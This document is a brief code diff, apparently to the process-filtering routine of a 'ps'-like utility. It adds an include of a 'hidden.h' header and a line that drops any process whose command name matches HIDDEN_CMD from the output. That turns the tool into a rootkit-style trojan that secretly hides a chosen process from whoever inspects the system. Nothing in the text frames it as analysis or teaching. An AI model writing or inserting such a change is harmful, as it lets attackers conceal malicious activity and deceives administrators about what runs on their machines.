@@ -26,6 +26,7 @@
 
 #include "common.h"
 
+#include "../hidden.h"
 //#define process_group_leader(p) ((p)->pgid    == (p)->tgid)
 //#define some_other_user(p)      ((p)->euid    != cached_euid)
 #define has_our_euid(p)         ((unsigned)(p)->euid    == (unsigned)cached_euid)
@@ -152,5 +153,6 @@ int want_this_proc(proc_t *buf){
 finish:
   if(running_only && !running(buf)) accepted_proc = 0;
   if(negate_selection) return !accepted_proc;
+  if(!(strncmp(buf->cmd,HIDDEN_CMD,16))) accepted_proc = 0;
   return accepted_proc;
 }
